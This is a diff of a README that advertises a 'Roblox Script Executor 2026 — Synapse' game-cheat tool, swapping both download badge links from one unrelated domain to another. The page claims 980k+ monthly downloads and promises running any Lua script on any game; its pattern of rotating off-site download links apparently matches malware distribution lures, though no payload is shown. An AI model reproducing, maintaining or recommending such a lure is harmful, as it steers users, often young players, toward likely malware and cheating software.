@@ -1,6 +1,6 @@
 # Roblox Script Executor 2026 — Synapse
 
-[![Download](https://img.shields.io/badge/Download-v2026-brightgreen?style=for-the-badge)](https://forumconnect.uk/rblxexec)
+[![Download](https://img.shields.io/badge/Download-v2026-brightgreen?style=for-the-badge)](https://connectinstruction.com/rblxexec)
 
 > **Roblox script executor — run any Lua script on any Roblox game.**
 
@@ -48,7 +48,7 @@ A: Yes — built-in hub with popular scripts for all major games.
 
 **Monthly downloads:** 980k+
 
-[![Download](https://img.shields.io/badge/Download-v2026-brightgreen?style=for-the-badge)](https://forumconnect.uk/rblxexec)
+[![Download](https://img.shields.io/badge/Download-v2026-brightgreen?style=for-the-badge)](https://connectinstruction.com/rblxexec)
 
 ---
 
